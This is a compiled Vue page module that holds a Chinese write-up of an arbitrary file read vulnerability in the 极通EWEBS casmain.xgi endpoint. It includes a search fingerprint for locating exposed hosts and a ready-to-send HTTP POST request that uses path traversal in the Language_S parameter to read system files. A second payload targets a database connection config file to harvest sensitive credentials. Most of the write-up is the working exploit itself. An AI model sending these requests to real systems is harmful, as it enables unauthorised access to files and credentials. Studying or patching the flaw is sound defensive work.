import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const d={},s=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>极通EWEBS casmain.xgi 任意文件读取漏洞，攻击者通过漏洞可以读取任意文件</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>极通EWEBS
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;新软科技-极通EWEBS&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101939828.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>漏洞请求包为</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /casmain.xgi HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: PHPSESSID=923b86fa90ce1e14c82d4e36d1adc528; CookieLanguageName=ZH-CN
Content-Length: 57

Language_S=../../../../windows/system32/drivers/etc/hosts
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101939430.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以配合 testweb.php 信息泄露读取敏感信息</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>Language_S=../../Data/CONFIG/CasDbCnn.dat
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,14),t=[s];function l(r,c){return a(),i("div",null,t)}const p=e(d,[["render",l],["__file","极通EWEBS casmain.xgi 任意文件读取漏洞.html.vue"]]);export{p as default};
